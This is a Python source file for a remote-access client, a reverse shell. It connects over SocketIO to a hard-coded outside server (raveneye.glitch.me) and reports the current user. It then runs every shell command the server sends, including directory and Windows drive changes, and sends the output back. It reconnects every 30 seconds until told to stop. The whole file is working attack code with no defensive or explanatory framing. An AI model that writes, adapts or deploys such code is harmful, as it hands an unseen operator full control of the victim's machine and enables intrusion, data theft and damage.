import subprocess
import socketio
import requests
import time
import os
import sys

# Initialize SocketIO client
sio = socketio.Client()

# Server URL
SERVER_URL = 'http://raveneye.glitch.me/'

# Get current working directory
def get_current_working_directory():
    return os.getcwd()

# Execute a shell command in a specified directory
def execute_command(cmd, cwd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=cwd)
        return result
    except Exception as e:
        return subprocess.CompletedProcess(cmd, returncode=-1, stderr=str(e))

# Get the current user
def get_current_user():
    result = execute_command('whoami', mycwd)
    return result.stdout.strip() if result.returncode == 0 else 'unknown_user'

# Global variables
mycwd = get_current_working_directory()  # Track current working directory
whoami = get_current_user()  # Track the user identity

# Event handler: on successful connection to the server
@sio.on('connect')
def on_connect():
    sio.emit('intro', whoami)  # Introduce user to the server upon connection

# Event handler: when receiving a 'cmd' event from the server
@sio.on('cmd')
def on_command_received(cmd):
    global mycwd

    # Check if the command is 'SleepNow'
    if cmd.strip().lower() == 'sleepnow':
        handle_sleep_now()
        return

    if cmd.startswith('cd '):
        path = cmd.split(' ', 1)[1]
        handle_directory_change(path)
    else:
        execute_and_emit_command(cmd)

# Handle the 'SleepNow' command: disconnect and exit
def handle_sleep_now():
    sio.emit('command', {'user': whoami, 'cmd': 'Shutting down as per SleepNow command'})
    time.sleep(3)
    sio.disconnect()
    sys.exit(0)

# Handle the change directory command
def handle_directory_change(path):
    global mycwd

    # Special case for Windows drive change
    if len(path) == 2 and path[1] == ':':  # e.g., 'D:'
        try:
            # Change the drive and set it to root if no directory is specified
            os.chdir(path + "\\")  # Switch to root of the drive
            mycwd = get_current_working_directory()
            sio.emit('command', {'user': whoami, 'cmd': f"Switched to {mycwd}"})
        except Exception as e:
            sio.emit('command', {'user': whoami, 'cmd': f"Error: {str(e)}"})
    else:
        try:
            # Attempt to change directory to the provided path
            os.chdir(path)
            mycwd = get_current_working_directory()  # Update cwd if successful
            sio.emit('command', {'user': whoami, 'cmd': f"Directory changed to {mycwd}"})
        except FileNotFoundError:
            sio.emit('command', {'user': whoami, 'cmd': f"Error: Directory not found: {path}"})
        except Exception as e:
            sio.emit('command', {'user': whoami, 'cmd': f"Error: {str(e)}"})

# Execute the command and emit the result back to the server
def execute_and_emit_command(cmd):
    result = execute_command(cmd, mycwd)

    if result.returncode == 0:
        sio.emit('command', {'user': whoami, 'cmd': result.stdout.strip()})
    else:
        sio.emit('command', {'user': whoami, 'cmd': f"Error: {result.stderr.strip()}"})

# Connect to the server with retries
def connect_to_server():
    while True:
        try:
            sio.connect(SERVER_URL)
            break
        except socketio.exceptions.ConnectionError as e:
            print(f"Connection failed: {e}. Retrying in 30 seconds...")
            time.sleep(30)

# Main
if __name__ == "__main__":
    connect_to_server()  # Attempt to connect to the server
    sio.wait()  # Keep the connection alive
